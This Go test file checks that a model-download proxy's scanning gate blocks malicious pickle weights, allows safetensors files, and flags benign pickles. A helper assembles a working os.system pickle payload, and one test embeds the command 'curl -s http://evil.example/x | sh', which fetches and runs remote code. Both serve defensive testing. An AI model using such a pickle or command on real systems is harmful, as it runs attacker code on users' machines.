package proxy

import (
	"bytes"
	"encoding/json"
	"io"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"testing"

	"github.com/blechschmidt/pullthrough-security/internal/backends"
	"github.com/blechschmidt/pullthrough-security/internal/backends/huggingface"
	"github.com/blechschmidt/pullthrough-security/internal/cache"
	"github.com/blechschmidt/pullthrough-security/internal/mlguard"
	"github.com/blechschmidt/pullthrough-security/internal/upstream"
)

// newMLGuardGateway builds a gateway whose "huggingface" backend fronts the given
// upstream and whose ML weight-scanning gate is seeded with the given service.
func newMLGuardGateway(t *testing.T, upstreamURL string, svc *mlguard.Service) *Gateway {
	t.Helper()
	registry := backends.NewRegistry()
	b, err := huggingface.New(huggingface.Options{
		Name:        "huggingface",
		UpstreamURL: upstreamURL,
		Client:      upstream.NewWithHTTPClient(http.DefaultClient, "test/1"),
	})
	if err != nil {
		t.Fatalf("huggingface.New: %v", err)
	}
	if err := registry.Register(b); err != nil {
		t.Fatalf("Register: %v", err)
	}
	g, err := New(Dependencies{
		Logger:     slog.New(slog.NewTextHandler(io.Discard, nil)),
		Cache:      cache.NewMemoryCache(),
		Backends:   registry,
		MLGuard:    svc,
		Ecosystems: map[string]string{"huggingface": "huggingface"},
	}, Options{HTTPAddr: ":0"})
	if err != nil {
		t.Fatalf("New: %v", err)
	}
	return g
}

func mustMLGuard(t *testing.T) *mlguard.Service {
	t.Helper()
	svc, err := mlguard.NewService(mlguard.DefaultConfig())
	if err != nil {
		t.Fatalf("mlguard.NewService: %v", err)
	}
	return svc
}

// maliciousPickle is a protocol-2 pickle that imports os.system and invokes it
// via REDUCE — the canonical malicious-model payload.
func maliciousPickle(cmd string) []byte {
	var b bytes.Buffer
	b.WriteByte(0x80) // PROTO
	b.WriteByte(2)
	b.WriteByte('c') // GLOBAL os\nsystem\n
	b.WriteString("os\nsystem\n")
	b.WriteByte('(')                              // MARK
	b.Write([]byte{'X', byte(len(cmd)), 0, 0, 0}) // BINUNICODE
	b.WriteString(cmd)
	b.WriteByte('t') // TUPLE
	b.WriteByte('R') // REDUCE
	b.WriteByte('.') // STOP
	return b.Bytes()
}

func TestMLGuardGateBlocksMaliciousPickle(t *testing.T) {
	payload := maliciousPickle("curl -s http://evil.example/x | sh")
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		_, _ = w.Write(payload)
	}))
	defer srv.Close()

	g := newMLGuardGateway(t, srv.URL, mustMLGuard(t))

	rr := httptest.NewRecorder()
	g.routes().ServeHTTP(rr, httptest.NewRequest(http.MethodGet, "/v1/huggingface/evil/model/resolve/main/pytorch_model.bin", nil))

	if rr.Code != http.StatusForbidden {
		t.Fatalf("status = %d, want 403 (body %q)", rr.Code, rr.Body.String())
	}
	if rr.Header().Get("X-MLGuard-Decision") != "block" {
		t.Errorf("missing X-MLGuard-Decision=block (got %q)", rr.Header().Get("X-MLGuard-Decision"))
	}
	var body mlGuardError
	if err := json.Unmarshal(rr.Body.Bytes(), &body); err != nil {
		t.Fatalf("decode body: %v", err)
	}
	if body.Code != "unsafe-pickle" || len(body.Imports) == 0 || body.Imports[0] != "os.system" {
		t.Errorf("unexpected block body: %+v", body)
	}

	// The poisoned weight must have been evicted; a re-pull re-fetches and is
	// blocked again rather than served clean from the cache.
	rr2 := httptest.NewRecorder()
	g.routes().ServeHTTP(rr2, httptest.NewRequest(http.MethodGet, "/v1/huggingface/evil/model/resolve/main/pytorch_model.bin", nil))
	if rr2.Code != http.StatusForbidden {
		t.Errorf("re-pull status = %d, want 403 (weight must not be served from cache)", rr2.Code)
	}
}

func TestMLGuardGateAllowsSafetensors(t *testing.T) {
	payload := []byte("safetensors header + tensors (no opcodes)")
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		_, _ = w.Write(payload)
	}))
	defer srv.Close()

	g := newMLGuardGateway(t, srv.URL, mustMLGuard(t))

	rr := httptest.NewRecorder()
	g.routes().ServeHTTP(rr, httptest.NewRequest(http.MethodGet, "/v1/huggingface/good/model/resolve/main/model.safetensors", nil))
	if rr.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200 (body %q)", rr.Code, rr.Body.String())
	}
	if !bytes.Equal(rr.Body.Bytes(), payload) {
		t.Error("served body does not match upstream safetensors")
	}
	if got := rr.Header().Get("X-MLGuard-Format"); got != "safetensors" {
		t.Errorf("X-MLGuard-Format = %q, want safetensors", got)
	}
}

func TestMLGuardGateFlagsPickleWithSafetensorsAdvisory(t *testing.T) {
	// A benign pickle (no dangerous imports) is served, but carries the advisory
	// header recommending safetensors.
	var b bytes.Buffer
	b.WriteByte(0x80)
	b.WriteByte(2)
	b.WriteByte('c')
	b.WriteString("collections\nOrderedDict\n")
	b.WriteByte(')')
	b.WriteByte('R')
	b.WriteByte('.')
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		_, _ = w.Write(b.Bytes())
	}))
	defer srv.Close()

	g := newMLGuardGateway(t, srv.URL, mustMLGuard(t))
	rr := httptest.NewRecorder()
	g.routes().ServeHTTP(rr, httptest.NewRequest(http.MethodGet, "/v1/huggingface/ok/model/resolve/main/pytorch_model.bin", nil))
	if rr.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200 (body %q)", rr.Code, rr.Body.String())
	}
	if got := rr.Header().Get("X-MLGuard-Prefer-Safetensors"); got != "true" {
		t.Errorf("X-MLGuard-Prefer-Safetensors = %q, want true", got)
	}
}
